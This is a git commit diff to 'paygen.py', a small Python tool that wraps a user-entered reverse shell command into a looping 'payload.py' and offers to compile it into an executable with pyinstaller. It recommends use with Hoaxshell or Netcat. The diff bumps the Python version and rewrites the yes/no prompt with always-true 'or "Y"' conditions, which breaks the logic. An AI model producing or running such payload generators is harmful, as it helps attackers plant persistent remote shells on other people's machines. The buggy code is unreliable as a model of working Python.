0d88f93db39e7062ff723ea0a4095767c19eda86
j3r1ch0123 <110147529+j3r1ch0123@users.noreply.github.com>
2022-10-18 22:18:29 -0400

    Update paygen.py

--- paygen.py
+++ paygen.py
@@ -1,4 +1,4 @@
-#!/bin/python3.9
+#!/bin/python3.10
 import os
 import time
 
@@ -9,7 +9,7 @@ print("\nIt is recommended that you use this tool with Hoaxshell or Netcat")
 payload = input("\nEnter reverse shell command: ")
 
 text = f'''\
-#!/bin/python3.9
+#!/bin/python3.10
 import os
 
 while True:
@@ -22,10 +22,10 @@ with open ("payload.py", "w") as thePayload:
     time.sleep(1)
     print("Payload generated!!! ")
     time.sleep(1)
-cont = input("Would you like to compile an executable? (y/n) ")
-if cont == "y":
+next = input("Would you like to compile an executable? (y/n) ")
+if next == "y" or "Y":
     os.system("pyinstaller --onefile payload.py")
-if cont == "n":
+if next == "n" or "N":
     os.system('cls' if os.name == 'nt' else 'clear')
     print("Closing in 3... 2... 1...")
 time.sleep(3)
